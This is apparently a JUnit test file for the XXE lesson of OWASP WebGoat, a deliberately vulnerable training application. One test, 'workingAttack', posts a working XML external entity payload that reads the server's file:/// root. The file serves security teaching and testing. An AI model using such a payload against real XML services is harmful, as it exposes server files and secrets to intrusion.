

package org.owasp.webgoat.lessons.xxe;

import static org.mockito.Mockito.when;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import org.hamcrest.CoreMatchers;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.owasp.webgoat.container.plugins.LessonTest;
import org.springframework.test.context.junit.jupiter.SpringExtension;
import org.springframework.test.web.servlet.request.MockMvcRequestBuilders;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;

@ExtendWith(SpringExtension.class)
public class SimpleXXETest extends LessonTest {

  @BeforeEach
  public void setup() {
    when(webSession.getCurrentLesson()).thenReturn(new XXE());
    this.mockMvc = MockMvcBuilders.webAppContextSetup(this.wac).build();
  }

  @Test
  public void workingAttack() throws Exception {
    // Call with XXE injection
    mockMvc
        .perform(
            MockMvcRequestBuilders.post("/xxe/simple")
                .content(
                    "<?xml version=\"1.0\" standalone=\"yes\" ?><!DOCTYPE user [<!ENTITY root"
                        + " SYSTEM \"file:///\"> ]><comment><text>&root;</text></comment>"))
        .andExpect(status().isOk())
        .andExpect(
            jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("assignment.solved"))));
  }

  @Test
  public void postingJsonCommentShouldNotSolveAssignment() throws Exception {
    mockMvc
        .perform(
            MockMvcRequestBuilders.post("/xxe/simple")
                .content("<comment><text>test</ext></comment>"))
        .andExpect(status().isOk())
        .andExpect(
            jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("assignment.not.solved"))));
  }

  @Test
  public void postingXmlCommentWithoutXXEShouldNotSolveAssignment() throws Exception {
    mockMvc
        .perform(
            MockMvcRequestBuilders.post("/xxe/simple")
                .content(
                    "<?xml version=\"1.0\" standalone=\"yes\""
                        + " ?><comment><text>&root;</text></comment>"))
        .andExpect(status().isOk())
        .andExpect(
            jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("assignment.not.solved"))));
  }

  @Test
  public void postingPlainTextShouldThrowException() throws Exception {
    mockMvc
        .perform(MockMvcRequestBuilders.post("/xxe/simple").content("test"))
        .andExpect(status().isOk())
        .andExpect(
            jsonPath("$.output", CoreMatchers.startsWith("jakarta.xml.bind.UnmarshalException")))
        .andExpect(
            jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("assignment.not.solved"))));
  }
}
